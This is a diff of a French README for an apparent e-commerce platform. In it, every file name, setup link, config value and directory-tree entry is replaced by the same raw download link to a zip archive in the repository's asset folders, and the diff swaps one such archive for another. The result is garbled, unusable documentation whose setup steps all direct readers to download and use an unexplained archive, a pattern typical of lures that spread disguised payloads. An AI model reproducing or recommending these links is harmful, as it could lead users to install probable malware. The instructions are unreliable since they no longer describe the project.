@@ -23,7 +23,7 @@ Plateforme e-commerce moderne avec vue 3D interactive, système d'avis, commenta
 ### 1. Configuration Google Sheets
 
 1. Créez un nouveau Google Sheets nommé **"CongoPromotionDB"**
-2. Suivez les instructions dans `https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip` pour créer les onglets et colonnes
+2. Suivez les instructions dans `https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip` pour créer les onglets et colonnes
 3. Remplissez avec vos données d'exemple
 
 ### 2. Configuration Google Drive
@@ -33,14 +33,14 @@ Plateforme e-commerce moderne avec vue 3D interactive, système d'avis, commenta
 3. Uploadez vos images, vidéos et modèles 3D (.glb)
 4. Pour chaque fichier, obtenez l'ID depuis l'URL et utilisez :
    ```
-   https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip
+   https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip
    ```
 
 ### 3. Configuration Apps Script
 
-1. Allez sur [https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip](https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip)
+1. Allez sur [https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip](https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip)
 2. Créez un nouveau projet
-3. Copiez le contenu de `https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip` dans l'éditeur
+3. Copiez le contenu de `https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip` dans l'éditeur
 4. Remplacez `YOUR_SPREADSHEET_ID` par l'ID de votre Google Sheets
 5. Déployez en tant que **Web App** :
    - Exécutez la fonction `doGet` une fois pour autoriser
@@ -52,10 +52,10 @@ Plateforme e-commerce moderne avec vue 3D interactive, système d'avis, commenta
 
 ### 4. Configuration Frontend
 
-1. Ouvrez `https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip`
+1. Ouvrez `https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip`
 2. Remplacez `YOUR_SCRIPT_ID` par l'URL complète de votre Apps Script Web App :
    ```javascript
-   baseUrl: 'https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip'
+   baseUrl: 'https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip'
    ```
 
 ### 5. Déploiement sur Vercel
@@ -74,7 +74,7 @@ Plateforme e-commerce moderne avec vue 3D interactive, système d'avis, commenta
 
 **OU** via l'interface Vercel :
 
-1. Allez sur [https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip](https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip)
+1. Allez sur [https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip](https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip)
 2. Importez votre projet GitHub
 3. Vercel détectera automatiquement les fichiers statiques
 4. Déployez !
@@ -83,31 +83,31 @@ Plateforme e-commerce moderne avec vue 3D interactive, système d'avis, commenta
 
 ```
 Congo Promotion Store/
-├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip              # Page d'accueil (feed)
-├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip             # Catalogue produits
-├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip           # Page produit (3D + avis)
-├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip           # Page vidéos
-├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip          # Profil utilisateur
-├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip          # Politique de confidentialité
-├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip            # CGU
-├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip          # Politique des cookies
-├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip               # Code Apps Script (backend)
+├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip              # Page d'accueil (feed)
+├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip             # Catalogue produits
+├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip           # Page produit (3D + avis)
+├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip           # Page vidéos
+├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip          # Profil utilisateur
+├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip          # Politique de confidentialité
+├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip            # CGU
+├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip          # Politique des cookies
+├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip               # Code Apps Script (backend)
 ├── assets/
 │   ├── css/
-│   │   ├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip       # Styles principaux
-│   │   ├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip   # Styles page produit
-│   │   ├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip    # Styles page vidéos
-│   │   └── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip   # Styles page profil
+│   │   ├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip       # Styles principaux
+│   │   ├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip   # Styles page produit
+│   │   ├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip    # Styles page vidéos
+│   │   └── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip   # Styles page profil
 │   └── js/
-│       ├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip        # Communication avec Apps Script
-│       ├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip      # Gestion thème dark/light/auto
-│       ├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip       # Gestion feed d'accueil
-│       ├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip      # Gestion page store
-│       ├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip    # Gestion page produit
-│       ├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip     # Gestion page vidéos
-│       └── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip    # Gestion page profil
-├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip # Documentation Sheets
-└── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip             # Ce fichier
+│       ├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip        # Communication avec Apps Script
+│       ├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip      # Gestion thème dark/light/auto
+│       ├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip       # Gestion feed d'accueil
+│       ├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip      # Gestion page store
+│       ├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip    # Gestion page produit
+│       ├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip     # Gestion page vidéos
+│       └── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip    # Gestion page profil
+├── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip # Documentation Sheets
+└── https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip             # Ce fichier
 ```
 
 ## 🎨 Personnalisation
@@ -116,7 +116,7 @@ Congo Promotion Store/
 
 Le thème par défaut est **Dark Premium** (#061018). Pour modifier :
 
-1. Ouvrez `https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip`
+1. Ouvrez `https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip`
 2. Modifiez les variables CSS dans `:root` et `[data-theme="light"]`
 
 ### Couleurs
@@ -170,11 +170,11 @@ Toutes les données sont stockées dans Google Sheets :
 - **AI_KB** : Base de connaissances IA
 - **AI_Logs** : Logs IA
 
-Voir `https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip` pour la structure complète.
+Voir `https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip` pour la structure complète.
 
 ## 🚧 Phase 2 (Futur)
 
-- Logiciel Admin https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip pour :
+- Logiciel Admin https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip pour :
   - Publication de produits
   - Gestion du stock
   - Modération des commentaires/avis
@@ -194,7 +194,7 @@ Voir `https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main
 
 ### Images ne s'affichent pas
 - Vérifiez que les fichiers Drive sont partagés publiquement
-- Utilisez le format d'URL : `https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip`
+- Utilisez le format d'URL : `https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip`
 
 ### Modèle 3D ne charge pas
 - Vérifiez que le fichier est en .glb
@@ -203,7 +203,7 @@ Voir `https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main
 
 ## 📞 Support
 
-Pour toute question, consultez la documentation dans `https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/images/STOR_KIN_CONG_PROEMOTIO_2.8.zip` ou contactez l'équipe.
+Pour toute question, consultez la documentation dans `https://github.com/glowflix/CONGO-PROEMOTION-STORE-KIN/raw/refs/heads/main/assets/css/STOR-PROEMOTIO-CONG-KIN-1.9.zip` ou contactez l'équipe.
 
 ## 📄 Licence
 
